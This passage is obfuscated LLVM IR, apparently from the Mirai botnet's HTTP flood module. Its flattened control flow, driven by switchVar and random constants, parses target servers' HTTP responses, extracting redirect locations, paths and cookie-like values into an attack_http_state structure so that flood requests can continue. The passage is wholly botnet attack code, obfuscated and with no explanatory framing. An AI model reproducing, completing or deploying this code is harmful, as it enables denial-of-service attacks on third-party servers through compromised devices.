; <label>:1430:                                   ; preds = %loopEntry
  %1431 = load i32, i32* %37, align 4
  %1432 = load i32, i32* %47, align 4
  %1433 = add nsw i32 %1431, %1432
  %1434 = load i32, i32* %48, align 4
  %1435 = add nsw i32 %1433, %1434
  %1436 = sext i32 %1435 to i64
  %1437 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1436
  store i8 0, i8* %1437, align 1
  store i32 0, i32* %10, align 4
  store i32 1112828761, i32* %switchVar
  br label %loopEnd

; <label>:1438:                                   ; preds = %loopEntry
  %1439 = load i32, i32* %10, align 4
  %1440 = load i8*, i8** %49, align 8
  %1441 = call i32 @util_strlen(i8* %1440)
  %1442 = icmp slt i32 %1439, %1441
  %1443 = select i1 %1442, i32 -1801475068, i32 1260779495
  store i32 %1443, i32* %switchVar
  br label %loopEnd

; <label>:1444:                                   ; preds = %loopEntry
  %1445 = load i8*, i8** %49, align 8
  %1446 = load i32, i32* %10, align 4
  %1447 = sext i32 %1446 to i64
  %1448 = getelementptr inbounds i8, i8* %1445, i64 %1447
  %1449 = load i8, i8* %1448, align 1
  %1450 = sext i8 %1449 to i32
  %1451 = icmp eq i32 %1450, 61
  %1452 = select i1 %1451, i32 -1297128240, i32 320263495
  store i32 %1452, i32* %switchVar
  br label %loopEnd

; <label>:1453:                                   ; preds = %loopEntry
  store i32 1260779495, i32* %switchVar
  br label %loopEnd

; <label>:1454:                                   ; preds = %loopEntry
  store i32 1928025049, i32* %switchVar
  br label %loopEnd

; <label>:1455:                                   ; preds = %loopEntry
  %1456 = load i32, i32* %10, align 4
  %1457 = add nsw i32 %1456, 1
  store i32 %1457, i32* %10, align 4
  store i32 1112828761, i32* %switchVar
  br label %loopEnd

; <label>:1458:                                   ; preds = %loopEntry
  %1459 = load i8*, i8** %49, align 8
  %1460 = load i32, i32* %10, align 4
  %1461 = sext i32 %1460 to i64
  %1462 = getelementptr inbounds i8, i8* %1459, i64 %1461
  %1463 = load i8, i8* %1462, align 1
  %1464 = sext i8 %1463 to i32
  %1465 = icmp eq i32 %1464, 61
  %1466 = select i1 %1465, i32 1379173004, i32 179251227
  store i32 %1466, i32* %switchVar
  br label %loopEnd

; <label>:1467:                                   ; preds = %loopEntry
  %1468 = load i32, i32* %10, align 4
  store i32 %1468, i32* %50, align 4
  store i32 0, i32* %51, align 4
  store i32 0, i32* %10, align 4
  store i32 -925722100, i32* %switchVar
  br label %loopEnd

; <label>:1469:                                   ; preds = %loopEntry
  %1470 = load i32, i32* %10, align 4
  %1471 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1472 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1471, i32 0, i32 15
  %1473 = load i32, i32* %1472, align 4
  %1474 = icmp slt i32 %1470, %1473
  %1475 = select i1 %1474, i32 -1166130531, i32 204376179
  store i32 %1475, i32* %switchVar
  br label %loopEnd

; <label>:1476:                                   ; preds = %loopEntry
  %1477 = load i8*, i8** %49, align 8
  %1478 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1479 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1478, i32 0, i32 16
  %1480 = load i32, i32* %10, align 4
  %1481 = sext i32 %1480 to i64
  %1482 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1479, i64 0, i64 %1481
  %1483 = getelementptr inbounds [128 x i8], [128 x i8]* %1482, i32 0, i32 0
  %1484 = load i32, i32* %50, align 4
  %1485 = call signext i8 @util_strncmp(i8* %1477, i8* %1483, i32 %1484)
  %1486 = icmp ne i8 %1485, 0
  %1487 = select i1 %1486, i32 -1223303963, i32 -734894585
  store i32 %1487, i32* %switchVar
  br label %loopEnd

; <label>:1488:                                   ; preds = %loopEntry
  store i32 1, i32* %51, align 4
  store i32 204376179, i32* %switchVar
  br label %loopEnd

; <label>:1489:                                   ; preds = %loopEntry
  store i32 -1150534157, i32* %switchVar
  br label %loopEnd

; <label>:1490:                                   ; preds = %loopEntry
  %1491 = load i32, i32* %10, align 4
  %1492 = add nsw i32 %1491, 1
  store i32 %1492, i32* %10, align 4
  store i32 -925722100, i32* %switchVar
  br label %loopEnd

; <label>:1493:                                   ; preds = %loopEntry
  %1494 = load i32, i32* %51, align 4
  %1495 = icmp ne i32 %1494, 0
  %1496 = select i1 %1495, i32 -1469345324, i32 80710409
  store i32 %1496, i32* %switchVar
  br label %loopEnd

; <label>:1497:                                   ; preds = %loopEntry
  %1498 = load i8*, i8** %49, align 8
  %1499 = call i32 @util_strlen(i8* %1498)
  %1500 = icmp slt i32 %1499, 128
  %1501 = select i1 %1500, i32 -862626423, i32 1052973682
  store i32 %1501, i32* %switchVar
  br label %loopEnd

; <label>:1502:                                   ; preds = %loopEntry
  %1503 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1504 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1503, i32 0, i32 16
  %1505 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1506 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1505, i32 0, i32 15
  %1507 = load i32, i32* %1506, align 4
  %1508 = sext i32 %1507 to i64
  %1509 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %1504, i64 0, i64 %1508
  %1510 = getelementptr inbounds [128 x i8], [128 x i8]* %1509, i32 0, i32 0
  %1511 = load i8*, i8** %49, align 8
  %1512 = call i32 @util_strcpy(i8* %1510, i8* %1511)
  %1513 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1514 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1513, i32 0, i32 15
  %1515 = load i32, i32* %1514, align 4
  %1516 = add nsw i32 %1515, 1
  store i32 %1516, i32* %1514, align 4
  store i32 1052973682, i32* %switchVar
  br label %loopEnd

; <label>:1517:                                   ; preds = %loopEntry
  store i32 -1469345324, i32* %switchVar
  br label %loopEnd

; <label>:1518:                                   ; preds = %loopEntry
  store i32 179251227, i32* %switchVar
  br label %loopEnd

; <label>:1519:                                   ; preds = %loopEntry
  store i32 -1062452684, i32* %switchVar
  br label %loopEnd

; <label>:1520:                                   ; preds = %loopEntry
  %1521 = load i32, i32* %47, align 4
  %1522 = load i32, i32* %37, align 4
  %1523 = add nsw i32 %1522, %1521
  store i32 %1523, i32* %37, align 4
  store i32 1709250680, i32* %switchVar
  br label %loopEnd

; <label>:1524:                                   ; preds = %loopEntry
  %1525 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1526 = load i32, i32* %12, align 4
  %1527 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1528 = call i32 @util_stristr(i8* %1525, i32 %1526, i8* %1527)
  %1529 = icmp ne i32 %1528, -1
  %1530 = select i1 %1529, i32 1970802667, i32 39250567
  store i32 %1530, i32* %switchVar
  br label %loopEnd

; <label>:1531:                                   ; preds = %loopEntry
  %1532 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1533 = load i32, i32* %12, align 4
  %1534 = call i8* @table_retrieve_val(i32 45, i32* null)
  %1535 = call i32 @util_stristr(i8* %1532, i32 %1533, i8* %1534)
  store i32 %1535, i32* %52, align 4
  %1536 = load i32, i32* %52, align 4
  %1537 = sext i32 %1536 to i64
  %1538 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1537
  %1539 = load i8, i8* %1538, align 1
  %1540 = sext i8 %1539 to i32
  %1541 = icmp eq i32 %1540, 32
  %1542 = select i1 %1541, i32 -335869158, i32 -1708895875
  store i32 %1542, i32* %switchVar
  br label %loopEnd

; <label>:1543:                                   ; preds = %loopEntry
  %1544 = load i32, i32* %52, align 4
  %1545 = add nsw i32 %1544, 1
  store i32 %1545, i32* %52, align 4
  store i32 -1708895875, i32* %switchVar
  br label %loopEnd

; <label>:1546:                                   ; preds = %loopEntry
  %1547 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1548 = load i32, i32* %52, align 4
  %1549 = sext i32 %1548 to i64
  %1550 = getelementptr inbounds i8, i8* %1547, i64 %1549
  %1551 = load i32, i32* %12, align 4
  %1552 = load i32, i32* %52, align 4
  %1553 = sub nsw i32 %1551, %1552
  %1554 = call i32 @util_memsearch(i8* %1550, i32 %1553, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1554, i32* %53, align 4
  %1555 = load i32, i32* %53, align 4
  %1556 = icmp ne i32 %1555, -1
  %1557 = select i1 %1556, i32 -346069399, i32 707226982
  store i32 %1557, i32* %switchVar
  br label %loopEnd

; <label>:1558:                                   ; preds = %loopEntry
  %1559 = load i32, i32* %52, align 4
  %1560 = sext i32 %1559 to i64
  %1561 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1560
  store i8* %1561, i8** %54, align 8
  %1562 = load i32, i32* %53, align 4
  %1563 = icmp sge i32 %1562, 2
  %1564 = select i1 %1563, i32 1601159582, i32 -1749150384
  store i32 %1564, i32* %switchVar
  br label %loopEnd

; <label>:1565:                                   ; preds = %loopEntry
  %1566 = load i32, i32* %53, align 4
  %1567 = sub nsw i32 %1566, 2
  store i32 %1567, i32* %53, align 4
  store i32 -1749150384, i32* %switchVar
  br label %loopEnd

; <label>:1568:                                   ; preds = %loopEntry
  %1569 = load i32, i32* %52, align 4
  %1570 = load i32, i32* %53, align 4
  %1571 = add nsw i32 %1569, %1570
  %1572 = sext i32 %1571 to i64
  %1573 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1572
  store i8 0, i8* %1573, align 1
  %1574 = load i32, i32* %53, align 4
  %1575 = add nsw i32 %1574, 1
  store i32 %1575, i32* %53, align 4
  %1576 = load i8*, i8** %54, align 8
  %1577 = load i32, i32* %53, align 4
  %1578 = call i32 @util_memsearch(i8* %1576, i32 %1577, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0), i32 4)
  %1579 = icmp eq i32 %1578, 4
  %1580 = select i1 %1579, i32 -249433302, i32 126444145
  store i32 %1580, i32* %switchVar
  br label %loopEnd

; <label>:1581:                                   ; preds = %loopEntry
  store i32 7, i32* %10, align 4
  %1582 = load i8*, i8** %54, align 8
  %1583 = getelementptr inbounds i8, i8* %1582, i64 4
  %1584 = load i8, i8* %1583, align 1
  %1585 = sext i8 %1584 to i32
  %1586 = icmp eq i32 %1585, 115
  %1587 = select i1 %1586, i32 -1117298415, i32 1321132725
  store i32 %1587, i32* %switchVar
  br label %loopEnd

; <label>:1588:                                   ; preds = %loopEntry
  %1589 = load i32, i32* %10, align 4
  %1590 = add nsw i32 %1589, 1
  store i32 %1590, i32* %10, align 4
  store i32 1321132725, i32* %switchVar
  br label %loopEnd

; <label>:1591:                                   ; preds = %loopEntry
  %1592 = load i8*, i8** %54, align 8
  %1593 = load i8*, i8** %54, align 8
  %1594 = load i32, i32* %10, align 4
  %1595 = sext i32 %1594 to i64
  %1596 = getelementptr inbounds i8, i8* %1593, i64 %1595
  %1597 = load i32, i32* %53, align 4
  %1598 = load i32, i32* %10, align 4
  %1599 = sub nsw i32 %1597, %1598
  %1600 = sext i32 %1599 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %1592, i8* %1596, i64 %1600, i32 1, i1 false)
  store i32 0, i32* %10, align 4
  store i32 -203107852, i32* %switchVar
  br label %loopEnd

; <label>:1601:                                   ; preds = %loopEntry
  %1602 = load i8*, i8** %54, align 8
  %1603 = load i32, i32* %10, align 4
  %1604 = sext i32 %1603 to i64
  %1605 = getelementptr inbounds i8, i8* %1602, i64 %1604
  %1606 = load i8, i8* %1605, align 1
  %1607 = sext i8 %1606 to i32
  %1608 = icmp ne i32 %1607, 0
  %1609 = select i1 %1608, i32 -1469230745, i32 1195225023
  store i32 %1609, i32* %switchVar
  br label %loopEnd

; <label>:1610:                                   ; preds = %loopEntry
  %1611 = load i8*, i8** %54, align 8
  %1612 = load i32, i32* %10, align 4
  %1613 = sext i32 %1612 to i64
  %1614 = getelementptr inbounds i8, i8* %1611, i64 %1613
  %1615 = load i8, i8* %1614, align 1
  %1616 = sext i8 %1615 to i32
  %1617 = icmp eq i32 %1616, 47
  %1618 = select i1 %1617, i32 1488305383, i32 1846213522
  store i32 %1618, i32* %switchVar
  br label %loopEnd

; <label>:1619:                                   ; preds = %loopEntry
  %1620 = load i8*, i8** %54, align 8
  %1621 = load i32, i32* %10, align 4
  %1622 = sext i32 %1621 to i64
  %1623 = getelementptr inbounds i8, i8* %1620, i64 %1622
  store i8 0, i8* %1623, align 1
  store i32 1195225023, i32* %switchVar
  br label %loopEnd

; <label>:1624:                                   ; preds = %loopEntry
  %1625 = load i32, i32* %10, align 4
  %1626 = add nsw i32 %1625, 1
  store i32 %1626, i32* %10, align 4
  store i32 -203107852, i32* %switchVar
  br label %loopEnd

; <label>:1627:                                   ; preds = %loopEntry
  %1628 = load i8*, i8** %54, align 8
  %1629 = call i32 @util_strlen(i8* %1628)
  %1630 = icmp sgt i32 %1629, 0
  %1631 = select i1 %1630, i32 1989716219, i32 143499530
  store i32 %1631, i32* %switchVar
  br label %loopEnd

; <label>:1632:                                   ; preds = %loopEntry
  %1633 = load i8*, i8** %54, align 8
  %1634 = call i32 @util_strlen(i8* %1633)
  %1635 = icmp slt i32 %1634, 128
  %1636 = select i1 %1635, i32 -1849013885, i32 143499530
  store i32 %1636, i32* %switchVar
  br label %loopEnd

; <label>:1637:                                   ; preds = %loopEntry
  %1638 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1639 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1638, i32 0, i32 7
  %1640 = getelementptr inbounds [129 x i8], [129 x i8]* %1639, i32 0, i32 0
  %1641 = load i8*, i8** %54, align 8
  %1642 = call i32 @util_strcpy(i8* %1640, i8* %1641)
  store i32 143499530, i32* %switchVar
  br label %loopEnd

; <label>:1643:                                   ; preds = %loopEntry
  %1644 = load i8*, i8** %54, align 8
  %1645 = load i32, i32* %10, align 4
  %1646 = add nsw i32 %1645, 1
  %1647 = sext i32 %1646 to i64
  %1648 = getelementptr inbounds i8, i8* %1644, i64 %1647
  %1649 = call i32 @util_strlen(i8* %1648)
  %1650 = icmp slt i32 %1649, 256
  %1651 = select i1 %1650, i32 398471102, i32 2043610165
  store i32 %1651, i32* %switchVar
  br label %loopEnd

; <label>:1652:                                   ; preds = %loopEntry
  %1653 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1654 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1653, i32 0, i32 6
  %1655 = getelementptr inbounds [257 x i8], [257 x i8]* %1654, i32 0, i32 0
  %1656 = getelementptr inbounds i8, i8* %1655, i64 1
  call void @util_zero(i8* %1656, i32 255)
  %1657 = load i8*, i8** %54, align 8
  %1658 = load i32, i32* %10, align 4
  %1659 = add nsw i32 %1658, 1
  %1660 = sext i32 %1659 to i64
  %1661 = getelementptr inbounds i8, i8* %1657, i64 %1660
  %1662 = call i32 @util_strlen(i8* %1661)
  %1663 = icmp sgt i32 %1662, 0
  %1664 = select i1 %1663, i32 -1389214695, i32 -2123881932
  store i32 %1664, i32* %switchVar
  br label %loopEnd

; <label>:1665:                                   ; preds = %loopEntry
  %1666 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1667 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1666, i32 0, i32 6
  %1668 = getelementptr inbounds [257 x i8], [257 x i8]* %1667, i32 0, i32 0
  %1669 = getelementptr inbounds i8, i8* %1668, i64 1
  %1670 = load i8*, i8** %54, align 8
  %1671 = load i32, i32* %10, align 4
  %1672 = add nsw i32 %1671, 1
  %1673 = sext i32 %1672 to i64
  %1674 = getelementptr inbounds i8, i8* %1670, i64 %1673
  %1675 = call i32 @util_strcpy(i8* %1669, i8* %1674)
  store i32 -2123881932, i32* %switchVar
  br label %loopEnd

; <label>:1676:                                   ; preds = %loopEntry
  store i32 2043610165, i32* %switchVar
  br label %loopEnd

; <label>:1677:                                   ; preds = %loopEntry
  store i32 -486286892, i32* %switchVar
  br label %loopEnd

; <label>:1678:                                   ; preds = %loopEntry
  %1679 = load i8*, i8** %54, align 8
  %1680 = getelementptr inbounds i8, i8* %1679, i64 0
  %1681 = load i8, i8* %1680, align 1
  %1682 = sext i8 %1681 to i32
  %1683 = icmp eq i32 %1682, 47
  %1684 = select i1 %1683, i32 1856115160, i32 -62087122
  store i32 %1684, i32* %switchVar
  br label %loopEnd

; <label>:1685:                                   ; preds = %loopEntry
  %1686 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1687 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1686, i32 0, i32 6
  %1688 = getelementptr inbounds [257 x i8], [257 x i8]* %1687, i32 0, i32 0
  %1689 = getelementptr inbounds i8, i8* %1688, i64 1
  call void @util_zero(i8* %1689, i32 255)
  %1690 = load i8*, i8** %54, align 8
  %1691 = load i32, i32* %10, align 4
  %1692 = add nsw i32 %1691, 1
  %1693 = sext i32 %1692 to i64
  %1694 = getelementptr inbounds i8, i8* %1690, i64 %1693
  %1695 = call i32 @util_strlen(i8* %1694)
  %1696 = icmp sgt i32 %1695, 0
  %1697 = select i1 %1696, i32 808037698, i32 1589336676
  store i32 %1697, i32* %switchVar
  br label %loopEnd

; <label>:1698:                                   ; preds = %loopEntry
  %1699 = load i8*, i8** %54, align 8
  %1700 = load i32, i32* %10, align 4
  %1701 = add nsw i32 %1700, 1
  %1702 = sext i32 %1701 to i64
  %1703 = getelementptr inbounds i8, i8* %1699, i64 %1702
  %1704 = call i32 @util_strlen(i8* %1703)
  %1705 = icmp slt i32 %1704, 256
  %1706 = select i1 %1705, i32 -165127797, i32 1589336676
  store i32 %1706, i32* %switchVar
  br label %loopEnd

; <label>:1707:                                   ; preds = %loopEntry
  %1708 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1709 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1708, i32 0, i32 6
  %1710 = getelementptr inbounds [257 x i8], [257 x i8]* %1709, i32 0, i32 0
  %1711 = getelementptr inbounds i8, i8* %1710, i64 1
  %1712 = load i8*, i8** %54, align 8
  %1713 = load i32, i32* %10, align 4
  %1714 = add nsw i32 %1713, 1
  %1715 = sext i32 %1714 to i64
  %1716 = getelementptr inbounds i8, i8* %1712, i64 %1715
  %1717 = call i32 @util_strcpy(i8* %1711, i8* %1716)
  store i32 1589336676, i32* %switchVar
  br label %loopEnd

; <label>:1718:                                   ; preds = %loopEntry
  store i32 -62087122, i32* %switchVar
  br label %loopEnd

; <label>:1719:                                   ; preds = %loopEntry
  store i32 -486286892, i32* %switchVar
  br label %loopEnd

; <label>:1720:                                   ; preds = %loopEntry
  %1721 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1722 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1721, i32 0, i32 1
  store i8 1, i8* %1722, align 4
  store i32 -1530442444, i32* %switchVar
  br label %loopEnd

; <label>:1723:                                   ; preds = %loopEntry
  store i32 39250567, i32* %switchVar
  br label %loopEnd

; <label>:1724:                                   ; preds = %loopEntry
  %1725 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1726 = load i32, i32* %12, align 4
  %1727 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1728 = call i32 @util_stristr(i8* %1725, i32 %1726, i8* %1727)
  %1729 = icmp ne i32 %1728, -1
  %1730 = select i1 %1729, i32 -423770351, i32 559412456
  store i32 %1730, i32* %switchVar
  br label %loopEnd

; <label>:1731:                                   ; preds = %loopEntry
  %1732 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1733 = load i32, i32* %12, align 4
  %1734 = call i8* @table_retrieve_val(i32 44, i32* null)
  %1735 = call i32 @util_stristr(i8* %1732, i32 %1733, i8* %1734)
  store i32 %1735, i32* %55, align 4
  %1736 = load i32, i32* %55, align 4
  %1737 = sext i32 %1736 to i64
  %1738 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1737
  %1739 = load i8, i8* %1738, align 1
  %1740 = sext i8 %1739 to i32
  %1741 = icmp eq i32 %1740, 32
  %1742 = select i1 %1741, i32 -1235084871, i32 -2014504945
  store i32 %1742, i32* %switchVar
  br label %loopEnd

; <label>:1743:                                   ; preds = %loopEntry
  %1744 = load i32, i32* %55, align 4
  %1745 = add nsw i32 %1744, 1
  store i32 %1745, i32* %55, align 4
  store i32 -2014504945, i32* %switchVar
  br label %loopEnd

; <label>:1746:                                   ; preds = %loopEntry
  %1747 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1748 = load i32, i32* %55, align 4
  %1749 = sext i32 %1748 to i64
  %1750 = getelementptr inbounds i8, i8* %1747, i64 %1749
  %1751 = load i32, i32* %12, align 4
  %1752 = load i32, i32* %55, align 4
  %1753 = sub nsw i32 %1751, %1752
  %1754 = call i32 @util_memsearch(i8* %1750, i32 %1753, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1754, i32* %56, align 4
  %1755 = load i32, i32* %56, align 4
  %1756 = icmp ne i32 %1755, -1
  %1757 = select i1 %1756, i32 1884461505, i32 1871134625
  store i32 %1757, i32* %switchVar
  br label %loopEnd

; <label>:1758:                                   ; preds = %loopEntry
  %1759 = load i32, i32* %55, align 4
  %1760 = sext i32 %1759 to i64
  %1761 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1760
  store i8* %1761, i8** %57, align 8
  %1762 = load i32, i32* %56, align 4
  %1763 = icmp sge i32 %1762, 2
  %1764 = select i1 %1763, i32 2140881858, i32 -1259857942
  store i32 %1764, i32* %switchVar
  br label %loopEnd

; <label>:1765:                                   ; preds = %loopEntry
  %1766 = load i32, i32* %56, align 4
  %1767 = sub nsw i32 %1766, 2
  store i32 %1767, i32* %56, align 4
  store i32 -1259857942, i32* %switchVar
  br label %loopEnd

; <label>:1768:                                   ; preds = %loopEntry
  %1769 = load i32, i32* %55, align 4
  %1770 = load i32, i32* %56, align 4
  %1771 = add nsw i32 %1769, %1770
  %1772 = sext i32 %1771 to i64
  %1773 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1772
  store i8 0, i8* %1773, align 1
  %1774 = load i32, i32* %56, align 4
  %1775 = add nsw i32 %1774, 1
  store i32 %1775, i32* %56, align 4
  store i32 0, i32* %10, align 4
  store i32 -118645065, i32* %switchVar
  br label %loopEnd

; <label>:1776:                                   ; preds = %loopEntry
  %1777 = load i8*, i8** %57, align 8
  %1778 = load i32, i32* %10, align 4
  %1779 = sext i32 %1778 to i64
  %1780 = getelementptr inbounds i8, i8* %1777, i64 %1779
  %1781 = load i8, i8* %1780, align 1
  %1782 = sext i8 %1781 to i32
  %1783 = icmp ne i32 %1782, 0
  %1784 = select i1 %1783, i32 -1816027858, i32 -305712772
  store i32 %1784, i32* %switchVar
  store i1 false, i1* %.reg2mem19
  br label %loopEnd

; <label>:1785:                                   ; preds = %loopEntry
  %1786 = load i8*, i8** %57, align 8
  %1787 = load i32, i32* %10, align 4
  %1788 = sext i32 %1787 to i64
  %1789 = getelementptr inbounds i8, i8* %1786, i64 %1788
  %1790 = load i8, i8* %1789, align 1
  %1791 = sext i8 %1790 to i32
  %1792 = icmp sge i32 %1791, 48
  %1793 = select i1 %1792, i32 -428736189, i32 -305712772
  store i32 %1793, i32* %switchVar
  store i1 false, i1* %.reg2mem19
  br label %loopEnd

; <label>:1794:                                   ; preds = %loopEntry
  %1795 = load i8*, i8** %57, align 8
  %1796 = load i32, i32* %10, align 4
  %1797 = sext i32 %1796 to i64
  %1798 = getelementptr inbounds i8, i8* %1795, i64 %1797
  %1799 = load i8, i8* %1798, align 1
  %1800 = sext i8 %1799 to i32
  %1801 = icmp sle i32 %1800, 57
  store i32 -305712772, i32* %switchVar
  store i1 %1801, i1* %.reg2mem19
  br label %loopEnd

; <label>:1802:                                   ; preds = %loopEntry
  %.reload20 = load i1, i1* %.reg2mem19
  %1803 = select i1 %.reload20, i32 -1386374493, i32 -1594205528
  store i32 %1803, i32* %switchVar
  br label %loopEnd

; <label>:1804:                                   ; preds = %loopEntry
  %1805 = load i32, i32* %10, align 4
  %1806 = add nsw i32 %1805, 1
  store i32 %1806, i32* %10, align 4
  store i32 -118645065, i32* %switchVar
  br label %loopEnd

; <label>:1807:                                   ; preds = %loopEntry
  %1808 = load i8*, i8** %57, align 8
  %1809 = load i32, i32* %10, align 4
  %1810 = sext i32 %1809 to i64
  %1811 = getelementptr inbounds i8, i8* %1808, i64 %1810
  %1812 = load i8, i8* %1811, align 1
  %1813 = sext i8 %1812 to i32
  %1814 = icmp ne i32 %1813, 0
  %1815 = select i1 %1814, i32 -455953039, i32 -2042162733
  store i32 %1815, i32* %switchVar
  br label %loopEnd

; <label>:1816:                                   ; preds = %loopEntry
  store i32 0, i32* %58, align 4
  %1817 = load i8*, i8** %57, align 8
  %1818 = load i32, i32* %10, align 4
  %1819 = sext i32 %1818 to i64
  %1820 = getelementptr inbounds i8, i8* %1817, i64 %1819
  store i8 0, i8* %1820, align 1
  %1821 = load i32, i32* %10, align 4
  %1822 = add nsw i32 %1821, 1
  store i32 %1822, i32* %10, align 4
  %1823 = load i8*, i8** %57, align 8
  %1824 = load i32, i32* %10, align 4
  %1825 = sext i32 %1824 to i64
  %1826 = getelementptr inbounds i8, i8* %1823, i64 %1825
  %1827 = load i8, i8* %1826, align 1
  %1828 = sext i8 %1827 to i32
  %1829 = icmp eq i32 %1828, 32
  %1830 = select i1 %1829, i32 1506782607, i32 -270344353
  store i32 %1830, i32* %switchVar
  br label %loopEnd

; <label>:1831:                                   ; preds = %loopEntry
  %1832 = load i32, i32* %10, align 4
  %1833 = add nsw i32 %1832, 1
  store i32 %1833, i32* %10, align 4
  store i32 -270344353, i32* %switchVar
  br label %loopEnd

; <label>:1834:                                   ; preds = %loopEntry
  %1835 = load i8*, i8** %57, align 8
  %1836 = load i32, i32* %10, align 4
  %1837 = sext i32 %1836 to i64
  %1838 = getelementptr inbounds i8, i8* %1835, i64 %1837
  %1839 = load i8*, i8** %57, align 8
  %1840 = load i32, i32* %10, align 4
  %1841 = sext i32 %1840 to i64
  %1842 = getelementptr inbounds i8, i8* %1839, i64 %1841
  %1843 = call i32 @util_strlen(i8* %1842)
  %1844 = call i32 @util_stristr(i8* %1838, i32 %1843, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1845 = icmp ne i32 %1844, -1
  %1846 = select i1 %1845, i32 162639720, i32 -157232052
  store i32 %1846, i32* %switchVar
  br label %loopEnd

; <label>:1847:                                   ; preds = %loopEntry
  %1848 = load i8*, i8** %57, align 8
  %1849 = load i32, i32* %10, align 4
  %1850 = sext i32 %1849 to i64
  %1851 = getelementptr inbounds i8, i8* %1848, i64 %1850
  %1852 = load i8*, i8** %57, align 8
  %1853 = load i32, i32* %10, align 4
  %1854 = sext i32 %1853 to i64
  %1855 = getelementptr inbounds i8, i8* %1852, i64 %1854
  %1856 = call i32 @util_strlen(i8* %1855)
  %1857 = call i32 @util_stristr(i8* %1851, i32 %1856, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i32 0, i32 0))
  %1858 = load i32, i32* %10, align 4
  %1859 = add nsw i32 %1858, %1857
  store i32 %1859, i32* %10, align 4
  store i32 -157232052, i32* %switchVar
  br label %loopEnd

; <label>:1860:                                   ; preds = %loopEntry
  %1861 = load i8*, i8** %57, align 8
  %1862 = load i32, i32* %10, align 4
  %1863 = sext i32 %1862 to i64
  %1864 = getelementptr inbounds i8, i8* %1861, i64 %1863
  %1865 = load i8, i8* %1864, align 1
  %1866 = sext i8 %1865 to i32
  %1867 = icmp eq i32 %1866, 34
  %1868 = select i1 %1867, i32 1771882494, i32 1851745042
  store i32 %1868, i32* %switchVar
  br label %loopEnd

; <label>:1869:                                   ; preds = %loopEntry
  %1870 = load i32, i32* %10, align 4
  %1871 = add nsw i32 %1870, 1
  store i32 %1871, i32* %10, align 4
  %1872 = load i8*, i8** %57, align 8
  %1873 = load i32, i32* %10, align 4
  %1874 = sext i32 %1873 to i64
  %1875 = getelementptr inbounds i8, i8* %1872, i64 %1874
  %1876 = load i8*, i8** %57, align 8
  %1877 = load i32, i32* %10, align 4
  %1878 = sext i32 %1877 to i64
  %1879 = getelementptr inbounds i8, i8* %1876, i64 %1878
  %1880 = call i32 @util_strlen(i8* %1879)
  %1881 = sub nsw i32 %1880, 1
  %1882 = sext i32 %1881 to i64
  %1883 = getelementptr inbounds i8, i8* %1875, i64 %1882
  %1884 = load i8, i8* %1883, align 1
  %1885 = sext i8 %1884 to i32
  %1886 = icmp eq i32 %1885, 34
  %1887 = select i1 %1886, i32 -1101738170, i32 89144342
  store i32 %1887, i32* %switchVar
  br label %loopEnd

; <label>:1888:                                   ; preds = %loopEntry
  %1889 = load i8*, i8** %57, align 8
  %1890 = load i32, i32* %10, align 4
  %1891 = sext i32 %1890 to i64
  %1892 = getelementptr inbounds i8, i8* %1889, i64 %1891
  %1893 = load i8*, i8** %57, align 8
  %1894 = load i32, i32* %10, align 4
  %1895 = sext i32 %1894 to i64
  %1896 = getelementptr inbounds i8, i8* %1893, i64 %1895
  %1897 = call i32 @util_strlen(i8* %1896)
  %1898 = sub nsw i32 %1897, 1
  %1899 = sext i32 %1898 to i64
  %1900 = getelementptr inbounds i8, i8* %1892, i64 %1899
  store i8 0, i8* %1900, align 1
